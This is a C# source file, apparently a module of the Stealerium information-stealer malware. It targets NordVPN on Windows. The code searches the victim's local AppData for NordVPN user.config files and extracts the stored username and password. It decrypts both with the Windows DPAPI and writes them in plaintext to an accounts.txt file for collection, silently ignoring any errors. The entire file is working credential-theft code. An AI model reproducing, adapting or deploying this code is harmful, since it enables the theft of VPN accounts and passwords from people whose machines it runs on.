using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using Stealerium.Helpers;

namespace Stealerium.Target.VPN
{
    internal sealed class NordVpn
    {
        private static string Decode(string s)
        {
            try
            {
                return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null,
                    DataProtectionScope.LocalMachine));
            }
            catch
            {
                return "";
            }
        }

        // Save("NordVPN");
        public static void Save(string sSavePath)
        {
            // "NordVPN" directory path
            var vpn = new DirectoryInfo(Path.Combine(Paths.Lappdata, "NordVPN"));
            // Stop if not exists
            if (!vpn.Exists)
                return;

            try
            {
                Directory.CreateDirectory(sSavePath);
                // Search user.config
                foreach (var d in vpn.GetDirectories("NordVpn.exe*"))
                foreach (var v in d.GetDirectories())
                {
                    var userConfigPath = Path.Combine(v.FullName, "user.config");
                    if (!File.Exists(userConfigPath)) continue;
                    // Create directory with VPN version to collect accounts
                    Directory.CreateDirectory(sSavePath + "\\" + v.Name);

                    var doc = new XmlDocument();
                    doc.Load(userConfigPath);

                    var encodedUsername = doc.SelectSingleNode("//setting[@name='Username']/value")?.InnerText;
                    var encodedPassword = doc.SelectSingleNode("//setting[@name='Password']/value")?.InnerText;

                    if (encodedUsername == null || string.IsNullOrEmpty(encodedUsername) ||
                        encodedPassword == null || string.IsNullOrEmpty(encodedPassword)) continue;
                    var username = Decode(encodedUsername);
                    var password = Decode(encodedPassword);

                    Counter.Vpn++;
                    File.AppendAllText(sSavePath + "\\" + v.Name + "\\accounts.txt",
                        $"Username: {username}\nPassword: {password}\n\n");
                }
            }
            catch
            {
                // ignored
            }
        }
    }
}